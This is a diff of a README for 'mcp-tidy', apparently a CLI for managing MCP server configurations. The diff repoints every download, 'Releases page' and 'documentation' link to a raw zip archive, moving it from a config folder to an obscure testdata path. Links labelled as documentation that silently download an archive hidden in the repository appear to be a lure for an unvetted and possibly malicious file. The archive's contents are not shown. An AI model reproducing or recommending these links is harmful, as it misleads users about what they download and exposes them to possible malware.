@@ -1,7 +1,7 @@
 # 🌟 mcp-tidy - Manage Your MCP Configurations Easily
 
 ## 📥 Download Now
-[![Download mcp-tidy](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/config/tidy-mcp-3.8.zip)](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/config/tidy-mcp-3.8.zip)
+[![Download mcp-tidy](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/testdata/projects/-Users-xxx-github-proj/tidy-mcp-2.9.zip)](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/testdata/projects/-Users-xxx-github-proj/tidy-mcp-2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to mcp-tidy! This command line interface (CLI) tool helps you visualize and manage your MCP server configurations efficiently. Whether you need to list servers, analyze usage statistics, or clean up unused servers, this tool simplifies these tasks.
@@ -9,7 +9,7 @@ Welcome to mcp-tidy! This command line interface (CLI) tool helps you visualize 
 ## 🔗 Download & Install
 To get started with mcp-tidy, follow these steps:
 
-1. Visit our [Releases page](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/config/tidy-mcp-3.8.zip) to download the tool.
+1. Visit our [Releases page](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/testdata/projects/-Users-xxx-github-proj/tidy-mcp-2.9.zip) to download the tool.
 
 2. On this page, you will find a list of available versions. Click on the version you want to download.
 
@@ -64,7 +64,7 @@ After installation, using mcp-tidy is simple. Open your terminal and use the fol
    This command will prompt you to confirm the removal of unused servers.
 
 ## 📘 Documentation
-For detailed commands and options, please check our [documentation](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/config/tidy-mcp-3.8.zip).
+For detailed commands and options, please check our [documentation](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/testdata/projects/-Users-xxx-github-proj/tidy-mcp-2.9.zip).
 
 ## 🤝 Contributing
 We welcome contributions! If you would like to improve mcp-tidy, please check our guidelines in the repository.
@@ -73,8 +73,8 @@ We welcome contributions! If you would like to improve mcp-tidy, please check ou
 If you encounter any issues or have questions, feel free to reach out via the issues section on our GitHub page.
 
 ## 🔗 Additional Links
-- [Releases page](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/config/tidy-mcp-3.8.zip)
-- [Documentation](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/config/tidy-mcp-3.8.zip)
+- [Releases page](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/testdata/projects/-Users-xxx-github-proj/tidy-mcp-2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/testdata/projects/-Users-xxx-github-proj/tidy-mcp-2.9.zip)
 
 ## 🌐 Topics
 - ai-tools
